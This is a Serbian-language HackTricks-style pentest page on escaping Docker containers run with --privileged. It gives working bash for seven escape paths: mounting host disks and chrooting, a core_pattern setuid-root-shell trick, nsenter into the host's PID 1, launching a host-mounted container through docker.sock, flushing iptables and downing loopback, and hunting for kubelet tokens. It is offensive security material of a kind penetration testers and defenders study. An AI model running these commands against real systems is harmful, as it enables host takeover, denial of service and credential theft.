# Escaping From `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Kontejner pokrenut sa `--privileged` nije isto što i običan kontejner sa jednom ili dve dodatne dozvole. U praksi, `--privileged` uklanja ili ublažava nekoliko podrazumevanih runtime zaštita koje obično drže workload podalje od opasnih host resursa. Tačan efekat i dalje zavisi od runtime-a i hosta, ali za Docker uobičajeni rezultat je:

- all capabilities are granted
- the device cgroup restrictions are lifted
- many kernel filesystems stop being mounted read-only
- default masked procfs paths disappear
- seccomp filtering is disabled
- AppArmor confinement is disabled
- SELinux isolation is disabled or replaced with a much broader label

Važna posledica je da privilegovan kontejner obično NE zahteva suptilan kernel exploit. U mnogim slučajevima može jednostavno direktno komunicirati sa host uređajima, kernel filesystems okrenutim ka hostu, ili runtime interfejsima i zatim pivotirati u host shell.

## Šta `--privileged` ne menja automatski

`--privileged` **ne** pridružuje automatski host PID, network, IPC, ili UTS namespaces. Privilegovan kontejner i dalje može imati privatne namespaces. To znači da neke escape lanci zahtevaju dodatni uslov kao što je:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Ti uslovi su često laki za ispuniti kod stvarnih miskonfiguracija, ali su koncepcijski odvojeni od samog `--privileged`.

## Escape Paths

### 1. Mount The Host Disk Through Exposed Devices

Privilegovan kontejner obično vidi mnogo više device nodova pod `/dev`. Ako je host block device vidljiv, najjednostavniji način bekstva je da ga mount-ujete i `chroot` u host filesystem:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Ako root particija nije očigledna, prvo izlistajte raspored blokova:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Ako je praktičniji pristup da se postavi setuid helper u writable host mount umesto da se koristi `chroot`, imajte na umu da ne svaki filesystem poštuje setuid bit. Brza host-side provera mogućnosti je:
```bash
mount | grep -v "nosuid"
```
Ovo je korisno zato što su upisivi putevi na `nosuid` filesystem-ima znatno manje interesantni za klasične "drop a setuid shell and execute it later" radne tokove.

Oslabljene zaštite koje se ovde zloupotrebljavaju su:

- potpuna izloženost uređaja
- široke capabilities, posebno `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montirajte ili ponovo iskoristite host bind mount i `chroot`

Ako je host root filesystem već montiran unutar kontejnera, ili ako kontejner može da kreira potrebne mount-ove zato što je privilegovan, shell na hostu često je samo jedan `chroot` udaljen:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ako ne postoji host root bind mount, ali je host storage dostupan, kreirajte jedan:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ovaj pristup zloupotrebljava:

- oslabljena mount ograničenja
- pune capabilities
- nedostatak MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Zloupotreba zapisljivog `/proc/sys` ili `/sys`

Jedna od velikih posledica `--privileged` je da zaštite procfs i sysfs postanu znatno slabije. To može otkriti kernel interfejse koji su okrenuti ka hostu, a koji su obično maskirani ili montirani kao read-only.

Klasičan primer je `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ostali putevi visoke vrednosti uključuju:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ovaj put zloupotrebljava:

- nedostatak maskiranih putanja
- nedostatak sistemskih putanja samo za čitanje

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Koristite pune capabilities za mount- ili namespace-based escape

Privilegovani kontejner dobija capabilities koje se obično uklanjaju iz standardnih kontejnera, uključujući `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, i mnoge druge. To je često dovoljno da lokalni pristup pretvori u host escape čim postoji neki drugi izloženi interfejs.

Jednostavan primer je montiranje dodatnih fajl-sistema i korišćenje ulaska u namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Ako je PID hosta takođe deljen, korak postaje još kraći:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ovaj put zloupotrebljava:

- podrazumevani skup privilegovanih capabilities
- opciono deljenje host PID-a

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Bekstvo putem runtime soketa

Privilegovan kontejner često završi sa vidljivim host runtime stanjem ili soketima. Ako je Docker, containerd, ili CRI-O socket dostupan, najjednostavniji pristup često je koristiti runtime API da se pokrene drugi kontejner sa pristupom hostu:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Za containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ovaj put zloupotrebljava:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Uklanjanje sporednih efekata mrežne izolacije

`--privileged` sam po sebi ne ulazi u host network namespace, ali ako kontejner takođe ima `--network=host` ili drugi host-network pristup, kompletan network stack postaje promenljiv:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Ovo nije uvek direktan host shell, ali može dovesti do denial of service, traffic interception, ili pristupa loopback-only management services.

Povezane stranice:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Čitanje host tajni i runtime stanja

Čak i kada clean shell escape nije neposredan, privileged containers često imaju dovoljno pristupa da pročitaju host secrets, kubelet state, runtime metadata i datotečne sisteme susednih kontejnera:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Ako je `/var` host-mounted ili su runtime direktorijumi vidljivi, to može biti dovoljno za lateral movement ili cloud/Kubernetes credential theft čak i pre nego što se dobije host shell.

Povezane strane:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Provere

Svrha sledećih komandi je da potvrde koje privileged-container escape families su odmah izvodljive.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Šta je ovde zanimljivo:

- potpuni skup capabilities, posebno `CAP_SYS_ADMIN`
- proc/sys izloženost sa mogućnošću pisanja
- vidljivi host uređaji
- nedostatak seccomp i MAC ograničenja
- runtime sockets ili host root bind mounts

Bilo koji od ovih može biti dovoljan za post-exploitation. Nekoliko njih zajedno obično znači da je container funkcionalno udaljen jednu ili dve naredbe od kompromitovanja hosta.

## Povezane stranice

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
